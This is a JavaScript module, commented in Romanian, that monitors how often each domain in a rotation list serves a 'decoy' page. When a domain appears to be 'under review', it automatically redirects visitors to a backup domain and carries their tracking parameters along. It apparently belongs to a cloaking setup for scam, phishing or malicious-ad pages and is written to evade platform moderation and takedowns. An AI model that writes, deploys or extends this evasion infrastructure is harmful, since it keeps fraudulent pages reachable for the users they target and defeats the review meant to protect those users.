// domain-rotation.js — health-based domain rotation
// Monitorizează rata de "clean page served" și rotează automat dacă domeniul e sub review

(function() {
  'use strict';

  var cfg = window.__CONFIG || {};

  // Lista de domenii backup — operatorul le pune în config
  var DOMAINS = cfg.ROTATION_DOMAINS || [];
  var HEALTH_PATH = cfg.HEALTH_PATH || '/__health';
  var CLOAK_THRESHOLD = cfg.CLOAK_THRESHOLD || 0.4; // dacă >40% requests primesc decoy = rotatăm
  var CHECK_INTERVAL = cfg.HEALTH_CHECK_INTERVAL || 60000; // verifică la 60s

  // Key localStorage pentru a persista domeniul curent ales
  var DOMAIN_KEY = '__rd';
  var STATS_KEY = '__rds';

  // --- Statistici locale ---
  function getStats() {
    try {
      return JSON.parse(localStorage.getItem(STATS_KEY) || '{}');
    } catch (e) { return {}; }
  }

  function saveStats(stats) {
    try {
      localStorage.setItem(STATS_KEY, JSON.stringify(stats));
    } catch (e) {}
  }

  function recordCloak(domain) {
    var stats = getStats();
    if (!stats[domain]) stats[domain] = { cloak: 0, total: 0, ts: Date.now() };
    stats[domain].cloak++;
    stats[domain].total++;
    saveStats(stats);
  }

  function recordNormal(domain) {
    var stats = getStats();
    if (!stats[domain]) stats[domain] = { cloak: 0, total: 0, ts: Date.now() };
    stats[domain].total++;
    saveStats(stats);
  }

  function getCloakRate(domain) {
    var stats = getStats();
    if (!stats[domain] || !stats[domain].total) return 0;
    return stats[domain].cloak / stats[domain].total;
  }

  // --- Health check pasiv ---
  function checkDomainHealth(domain) {
    return fetch('https://' + domain + HEALTH_PATH, {
      method: 'GET',
      cache: 'no-store',
      signal: AbortSignal.timeout ? AbortSignal.timeout(5000) : undefined
    }).then(function(r) {
      if (!r.ok) return { ok: false, domain };
      return r.json().then(function(data) {
        return { ok: data.ok === true, domain };
      });
    }).catch(function() {
      return { ok: false, domain };
    });
  }

  // --- Alege cel mai sănătos domeniu ---
  function pickHealthyDomain() {
    if (!DOMAINS.length) return null;

    // Elimină domeniile cu cloak rate > threshold
    var healthy = DOMAINS.filter(function(d) {
      return getCloakRate(d) <= CLOAK_THRESHOLD;
    });

    if (!healthy.length) {
      // Toți sunt flagged — alege cel cu cel mai mic cloak rate
      return DOMAINS.sort(function(a, b) {
        return getCloakRate(a) - getCloakRate(b);
      })[0];
    }

    // Returnează primul sănătos
    return healthy[0];
  }

  // --- Redirect la domeniu alternativ dacă e necesar ---
  function maybeRotate() {
    if (!DOMAINS.length) return;

    var currentDomain = window.location.hostname;
    var cloakRate = getCloakRate(currentDomain);

    if (cloakRate > CLOAK_THRESHOLD) {
      var target = pickHealthyDomain();
      if (target && target !== currentDomain) {
        // Salvăm params pentru a-i păstra după redirect
        var params = window.__params || {};
        var qs = Object.entries(params)
          .filter(function(p) { return p[1]; })
          .map(function(p) { return encodeURIComponent(p[0]) + '=' + encodeURIComponent(p[1]); })
          .join('&');

        var newUrl = 'https://' + target + window.location.pathname +
          (qs ? '?' + qs : '');

        // Salvăm în localStorage ca să nu facem loop
        localStorage.setItem(DOMAIN_KEY, target);
        window.location.replace(newUrl);
      }
    }
  }

  // --- Detectare dacă suntem pe un domeniu de backup (am fost rotați) ---
  function isRotated() {
    var saved = localStorage.getItem(DOMAIN_KEY);
    return saved && saved === window.location.hostname;
  }

  // --- Monitor periodic ---
  function startMonitor() {
    if (!DOMAINS.length) return;

    // Check la intervale regulate
    setInterval(function() {
      var currentDomain = window.location.hostname;

      // Health check async pe toate domeniile
      Promise.all(DOMAINS.map(checkDomainHealth)).then(function(results) {
        results.forEach(function(r) {
          if (r.ok) {
            recordNormal(r.domain);
          } else {
            recordCloak(r.domain);
          }
        });

        // Verifică dacă trebuie să rotăm
        maybeRotate();
      });
    }, CHECK_INTERVAL);

    // Check imediat la start
    setTimeout(maybeRotate, 5000);
  }

  // --- API public ---
  window.__domainRotation = {
    start: startMonitor,
    rotate: maybeRotate,
    pickHealthy: pickHealthyDomain,
    getCloakRate: getCloakRate,
    recordCloak: recordCloak,
    recordNormal: recordNormal,
    isRotated: isRotated
  };

  // Auto-start
  startMonitor();

})();
